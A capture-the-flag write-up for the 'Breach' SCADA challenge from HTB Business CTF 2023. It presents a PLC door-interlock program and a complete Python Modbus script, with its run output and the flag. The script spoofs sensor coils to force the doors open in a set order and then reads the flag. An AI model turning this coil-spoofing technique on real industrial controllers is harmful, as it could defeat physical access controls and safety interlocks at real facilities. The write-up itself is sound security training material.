# Breach (Scada Challenge)
HTB Business CTF 2023
Writeup by: @godylockz

## Challenge Description
Name: Breach
Category: Scada
Difficulty: Medium
Points: 600
Our relentless search led us to a secure testing site, a hub for concocting chemicals used in planet terraforming. Given its critical nature, a unique door system segregates the entire facility, allowing only a single door to open before a decontamination process ensues. Currently, the control sensors seem to be inoperative, keeping the system idle. Intriguingly, someone seems to have hardwired the sensor inputs to the output coils. Perhaps, this might be our entry point into the building.

## Challenge Files
Instructions.txt
```text
1. The door order that must be achieved to successfully allow the team to infiltrate the building is: [door_3, door_0, door_4, door_1, door_2] and must be sequential.
2. The coils for the doors have restricted access on the Modbus network and can not be written.
3. The sensors are hardwired to coils, thus driving the coil will result in the sensor signal being altered.
4. SYSTEM REST: Upon mission completion, the system will reset after approximately two minutes.
5. FLAG: the flag will be available on the holding registers starting at address 4 upon completion of the mission.
```

door_control_subsystem.st
```text
// Configuration notes:
// 8-bit word size
// Modify Modbus coil access to restrict door coils
PROGRAM door_control
  VAR
    system_active AT %QX75.2 : BOOL := 0;
  END_VAR
  VAR
    Door_0 AT %Q4.0 : BOOL := 0; // Restrict write access via Modbus
    Door_1 AT %Q4.1 : BOOL := 0; // Restrict write access via Modbus
    Door_2 AT %Q4.2 : BOOL := 0; // Restrict write access via Modbus
    Door_3 AT %Q4.3 : BOOL := 0; // Restrict write access via Modbus
    Door_4 AT %Q4.4 : BOOL := 0; // Restrict write access via Modbus
    sensor_0 AT %QX8.0 : BOOL := 0;
    sensor_1 AT %QX8.1 : BOOL := 0;
    sensor_2 AT %QX8.2 : BOOL := 0;
    sensor_3 AT %QX8.3 : BOOL := 0;
    sensor_4 AT %QX8.4 : BOOL := 0;
    sensor_5 AT %QX37.0 : BOOL := 0;
    sensor_6 AT %QX37.1 : BOOL := 0;
    sensor_7 AT %QX37.2 : BOOL := 0;
    sensor_8 AT %QX37.3 : BOOL := 0;
    sensor_9 AT %QX37.4 : BOOL := 0;
    sensor_10 AT %QX52.0 : BOOL := 0;
    sensor_11 AT %QX52.6 : BOOL := 0;
    sensor_12 AT %QX16.6 : BOOL := 0;
    sensor_13 AT %QX16.7 : BOOL := 0;
    sensor_14 AT %QX16.0 : BOOL := 0;
  END_VAR
  VAR
    TON0 : TON;
  END_VAR
  VAR_TEMP
    door_timer_0 : TIME;
    door_timer_1 : TIME;
    door_timer_2 : TIME;
    door_timer_3 : TIME;
    door_timer_4 : TIME;
  END_VAR
  VAR
    TON1 : TON;
    TON2 : TON;
    TON3 : TON;
    TON4 : TON;
  END_VAR

  TON0(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_1) AND sensor_4 AND NOT(sensor_2) AND sensor_1 AND sensor_0 AND system_active, PT := T#8000ms);
  Door_0 := TON0.Q;
  door_timer_0 := TON0.ET;
  TON1(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_0) AND sensor_7 AND NOT(sensor_6) AND sensor_5 AND sensor_0 AND system_active, PT := T#5000ms);
  Door_1 := TON1.Q;
  door_timer_1 := TON1.ET;
  TON2(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_1) AND NOT(Door_0) AND sensor_11 AND NOT(sensor_7) AND sensor_10 AND sensor_5 AND system_active, PT := T#8000ms);
  Door_2 := TON2.Q;
  door_timer_2 := TON2.ET;
  TON3(IN := NOT(Door_4) AND NOT(Door_1) AND NOT(Door_2) AND NOT(Door_0) AND sensor_13 AND sensor_12 AND NOT(sensor_11) AND sensor_10 AND system_active, PT := T#5000ms);
  Door_3 := TON3.Q;
  door_timer_3 := TON3.ET;
  TON4(IN := NOT(Door_1) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_0) AND sensor_14 AND sensor_13 AND sensor_12 AND sensor_10 AND system_active, PT := T#8000ms);
  Door_4 := TON4.Q;
  door_timer_4 := TON4.ET;
END_PROGRAM


CONFIGURATION Config0

  RESOURCE Res0 ON PLC
    TASK task0(INTERVAL := T#20ms,PRIORITY := 0);
    PROGRAM instance0 WITH task0 : door_control;
  END_RESOURCE
END_CONFIGURATION
```

## Strategy
The `door_control_subsystem.st` is a file containing a ladder logic program written in a PLC programming language. It controls the behavior of doors and sensors based on certain conditions. 
The `%QX52.2` notation, the `Q` probably to a digital output (also known as a boolean output), and `X52.2` is the address of that output. The `X` here could  indicate an input or output, and `52.0` specifies the specific address or bit number within the output such that `QX52.2 -> address = 52*8 + 2`

Viewing the input conditions of all the doors, door 3/4 have very similar input conditions and to have door 4 specifically open and not door 3, sensor_11 also needs to be held True.

The following python code was used to automate the solving of this challenge and sending Modbus commands. After all the doors have been opened in the correct order, we read the specific holding registers for the flag!

## Python Solution Code
```python
#!/usr/bin/env python3

# Imports
from cmd import Cmd
import socket
from umodbus import conf
from umodbus.client import tcp
from time import sleep
from sys import exit

# Adjust modbus configuration
conf.SIGNED_VALUES = True

# Verbose output
VERBOSE = False

# Modbus coil addresses for doors
# QX1.2 -> address = 1*8 + 2
ADDRESSES = {
    "door_0":        32,  # 4*8+0 %Q4.0
    "door_1":        33,  # 4*8+1 %Q4.1
    "door_2":        34,  # 4*8+2 %Q4.2
    "door_3":        35,  # 4*8+3 %Q4.3
    "door_4":        36,  # 4*8+4 %Q4.4
    "sensor_0":      64,  # 8*8+0 %QX8.0
    "sensor_1":      65,  # 8*8+1 %QX8.1
    "sensor_2":      66,  # 8*8+2 %QX8.2
    "sensor_3":      67,  # 8*8+3 %QX8.3
    "sensor_4":      68,  # 8*8+4 %QX8.4
    "sensor_5":      296,  # 37*8+0 %QX37.0
    "sensor_6":      297,  # 37*8+1 %QX37.1
    "sensor_7":      298,  # 37*8+2 %QX37.2
    "sensor_8":      299,  # 37*8+3 %QX37.3
    "sensor_9":      300,  # 37*8+4 %QX37.4
    "sensor_10":     416,  # 52*8+0 %QX52.0
    "sensor_11":     422,  # 52*8+6 %QX52.6
    "sensor_12":     134,  # 16*8+6 %QX16.6
    "sensor_13":     135,  # 16*8+7 %QX16.7
    "sensor_14":     128,  # 16*8+0 %QX16.0
    "system_active": 602,  # 75*8+2 %QX75.2
}

# Change to the dockers instance
DOCKER_IP = "83.136.254.230"
DOCKER_PORT = 43419

SLAVE_ID = 1  # unit_id


def reset_all_sensors(sock, slave_id):
    # Reset all sensors
    print("[*] Resetting sensors ...")
    for key in ADDRESSES.keys():
        if not key.startswith("door"):  # cannot set doors
            set_sensor_value(sock, slave_id, key, False, print_flag=False)


def read_sensor_values(sock, slave_id):
    # Read sensor values from Modbus
    print(f"[*] Reading sensor values ...")
    sensor_values = {}
    for key, address in ADDRESSES.items():
        request = tcp.read_coils(
            slave_id=slave_id, starting_address=address, quantity=1)
        response = tcp.send_message(request, sock)
        sensor_values[key] = response[0]
    for key, value in sensor_values.items():
        if VERBOSE:
            print(f"  {key} = {bool(value)}")
    return sensor_values


def set_sensor_value(sock, slave_id, sensor, value, print_flag=True):
    if print_flag:
        print(f"  Setting {sensor} => {value} ...")
    request = tcp.write_single_coil(
        slave_id=slave_id, address=ADDRESSES[sensor], value=value)
    response = tcp.send_message(request, sock)
    sleep(0.1)
    return response


def open_doors(sock, slave_id):
    reset_all_sensors(sock, slave_id)
    sensor_values = read_sensor_values(sock, slave_id)

    while not sensor_values["door_3"]:
        # TON3(IN := NOT(Door_4) AND NOT(Door_1) AND NOT(Door_2) AND NOT(Door_0) AND sensor_13 AND sensor_12 AND NOT(sensor_11) AND sensor_10 AND system_active, PT := T#5000ms);
        print("[*] Opening door 3 ...")
        set_sensor_value(sock, slave_id, "sensor_13", True)
        set_sensor_value(sock, slave_id, "sensor_12", True)
        set_sensor_value(sock, slave_id, "sensor_11", False)
        set_sensor_value(sock, slave_id, "sensor_10", True)
        set_sensor_value(sock, slave_id, "system_active", True)
        sleep(12)
        sensor_values = read_sensor_values(sock, slave_id)

    reset_all_sensors(sock, slave_id)
    sensor_values = read_sensor_values(sock, slave_id)

    while not sensor_values["door_0"]:
        # TON0(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_1) AND sensor_4 AND NOT(sensor_2) AND sensor_1 AND sensor_0 AND system_active, PT := T#8000ms);
        print("[*] Opening door 0 ...")
        set_sensor_value(sock, slave_id, "sensor_4", True)
        set_sensor_value(sock, slave_id, "sensor_2", False)
        set_sensor_value(sock, slave_id, "sensor_1", True)
        set_sensor_value(sock, slave_id, "sensor_0", True)
        set_sensor_value(sock, slave_id, "system_active", True)
        sleep(12)
        sensor_values = read_sensor_values(sock, slave_id)

    reset_all_sensors(sock, slave_id)
    sensor_values = read_sensor_values(sock, slave_id)

    while not sensor_values["door_4"]:
        # TON4(IN := NOT(Door_1) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_0) AND sensor_14 AND sensor_13 AND sensor_12 AND sensor_10 AND system_active, PT := T#8000ms);
        print("[*] Opening door 4 ...")
        set_sensor_value(sock, slave_id, "sensor_14", True)
        set_sensor_value(sock, slave_id, "sensor_13", True)
        set_sensor_value(sock, slave_id, "sensor_12", True)
        set_sensor_value(sock, slave_id, "sensor_11",
                         True)  # Confliction w/ door 3
        set_sensor_value(sock, slave_id, "sensor_10", True)
        set_sensor_value(sock, slave_id, "system_active", True)
        sleep(12)
        sensor_values = read_sensor_values(sock, slave_id)

    reset_all_sensors(sock, slave_id)
    sensor_values = read_sensor_values(sock, slave_id)

    while not sensor_values["door_1"]:
        # TON1(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_0) AND sensor_7 AND NOT(sensor_6) AND sensor_5 AND sensor_0 AND system_active, PT := T#5000ms);
        print("[*] Opening door 1 ...")
        set_sensor_value(sock, slave_id, "sensor_7", True)
        set_sensor_value(sock, slave_id, "sensor_6", False)
        set_sensor_value(sock, slave_id, "sensor_5", True)
        set_sensor_value(sock, slave_id, "sensor_0", True)
        set_sensor_value(sock, slave_id, "system_active", True)
        sleep(12)
        sensor_values = read_sensor_values(sock, slave_id)

    reset_all_sensors(sock, slave_id)
    sensor_values = read_sensor_values(sock, slave_id)

    while not sensor_values["door_2"]:
        # TON2(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_1) AND NOT(Door_0) AND sensor_11 AND NOT(sensor_7) AND sensor_10 AND sensor_5 AND system_active, PT := T#8000ms);
        print("[*] Opening door 2 ...")
        set_sensor_value(sock, slave_id, "sensor_11", True)
        set_sensor_value(sock, slave_id, "sensor_7", False)
        set_sensor_value(sock, slave_id, "sensor_10", True)
        set_sensor_value(sock, slave_id, "sensor_5", True)
        set_sensor_value(sock, slave_id, "system_active", True)
        sleep(12)
        sensor_values = read_sensor_values(sock, slave_id)

    reset_all_sensors(sock, slave_id)
    sensor_values = read_sensor_values(sock, slave_id)


def read_coils(sock, unit_id, address):
    """Read coils.
    Return ADU for Modbus function code 01: Read Coils
    Coils are 1-bit registers, are used to control discrete outputs, and may be read or written.
    """
    quantity = 1  # Number of coils to read
    if VERBOSE:
        print(
        f"[*](unit: {unit_id}, addr: {address}) Attempting to read coils ...")
    request = tcp.read_coils(
        slave_id=unit_id, starting_address=address, quantity=quantity)
    response = tcp.send_message(request, sock)
    coil_bin = "".join(str(bit) for bit in response)
    coil_int = int(coil_bin, 2)
    coil_ascii = chr(coil_int)
    if VERBOSE:
        print(
        f"[+](unit: {unit_id}, addr: {address}) Coils -  {coil_int} | {coil_bin} | {coil_ascii}")
    return coil_ascii


def read_discrete_input(sock, unit_id, address):
    """Read discrete input.
    Return ADU for Modbus function code 02: Read Discrete Input.
    Discrete Inputs are 1-bit registers used as inputs, and may only be read.
    """
    quantity = 1  # Number of discretes to read
    if VERBOSE:
        print(
        f"[*](unit: {unit_id}, addr: {address}) Attempting to read coils ...")
    request = tcp.read_discrete_inputs(
        slave_id=unit_id, starting_address=address, quantity=quantity)
    response = tcp.send_message(request, sock)
    coil_bin = "".join(str(bit) for bit in response)
    coil_int = int(coil_bin, 2)
    coil_ascii = chr(coil_int)
    if VERBOSE:
        print(
        f"[+](unit: {unit_id}, addr: {address}) Coils -  {coil_int} | {coil_bin} | {coil_ascii}")
    return coil_ascii


def read_holding_registers(sock, unit_id, address):
    """Read holding registers.
    Return ADU for Modbus function code 03: Read Holding Registers.
    Holding registers are the most universal 16-bit register, may be read or written, and may be used for a variety of things including inputs, outputs, configuration data, or any requirement for "holding" data.
    """
    quantity = 1  # Number of registers to read
    if VERBOSE:
        print(
        f"[*](unit: {unit_id}, addr: {address}) Attempting to read holding registers ...")
    request = tcp.read_holding_registers(
        slave_id=unit_id, starting_address=address, quantity=quantity)
    response = tcp.send_message(request, sock)
    coil_ascii = "".join(chr(integer) for integer in response)
    if VERBOSE:
        print(
        f"[+](unit: {unit_id}, addr: {address}) Holding Registers - {response} | {coil_ascii}")
    return coil_ascii


def read_input_registers(sock, unit_id, address):
    """Read input registers.
    Return ADU for Modbus function code 04: Read Input Registers.
    Input registers are 16-bit registers used for input, and may only be read. Holding registers are the most universal 16-bit register, may be read or written, and may be used for a variety of things including inputs, outputs, configuration data, or any requirement for "holding" data.
    """
    if VERBOSE:
        print(
        f"[*](unit: {unit_id}, addr: {address}) Attempting to read input registers ...")
    quantity = 1  # Number of input registers to read
    request = tcp.read_input_registers(
        slave_id=unit_id, starting_address=address, quantity=quantity)
    response = tcp.send_message(request, sock)
    coil_ascii = "".join(chr(integer) for integer in response)
    if VERBOSE:
        print(
        f"[+](unit: {unit_id}, addr: {address}) Input Registers - {response} | {coil_ascii}")
    return coil_ascii


def read_flag(sock, unit_id):
    print("[*] Reading the flag ...")
    out = ""
    for address in range(4, 100):
        value = read_holding_registers(sock, unit_id, address)
        if not value:
            break
        out += value
        sleep(0.1)
    print(out)

###################################################
# MAIN
###################################################


# Connect to modbus
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((DOCKER_IP, DOCKER_PORT))

# Open doors based on sensor values
open_doors(sock, SLAVE_ID)

# Read flag
read_flag(sock, SLAVE_ID)
```

```sh
$ python3 breached-sol.py
[*] Resetting sensors ...
[*] Reading sensor values ...
[*] Opening door 3 ...
  Setting sensor_13 => True ...
  Setting sensor_12 => True ...
  Setting sensor_11 => False ...
  Setting sensor_10 => True ...
  Setting system_active => True ...
[*] Reading sensor values ...
[*] Resetting sensors ...
[*] Reading sensor values ...
[*] Opening door 0 ...
  Setting sensor_4 => True ...
  Setting sensor_2 => False ...
  Setting sensor_1 => True ...
  Setting sensor_0 => True ...
  Setting system_active => True ...
[*] Reading sensor values ...
[*] Resetting sensors ...
[*] Reading sensor values ...
[*] Opening door 4 ...
  Setting sensor_14 => True ...
  Setting sensor_13 => True ...
  Setting sensor_12 => True ...
  Setting sensor_11 => True ...
  Setting sensor_10 => True ...
  Setting system_active => True ...
[*] Reading sensor values ...
[*] Resetting sensors ...
[*] Reading sensor values ...
[*] Opening door 1 ...
  Setting sensor_7 => True ...
  Setting sensor_6 => False ...
  Setting sensor_5 => True ...
  Setting sensor_0 => True ...
  Setting system_active => True ...
[*] Reading sensor values ...
[*] Resetting sensors ...
[*] Reading sensor values ...
[*] Opening door 2 ...
  Setting sensor_11 => True ...
  Setting sensor_7 => False ...
  Setting sensor_10 => True ...
  Setting sensor_5 => True ...
  Setting system_active => True ...
[*] Reading sensor values ...
[*] Resetting sensors ...
[*] Reading sensor values ...
[*] Reading the flag ...
HTB{m15510n_c0mp1373d_734m_8234ch3d_7h3_f4c1117y!394}
```

Flag: `HTB{m15510n_c0mp1373d_734m_8234ch3d_7h3_f4c1117y!394}`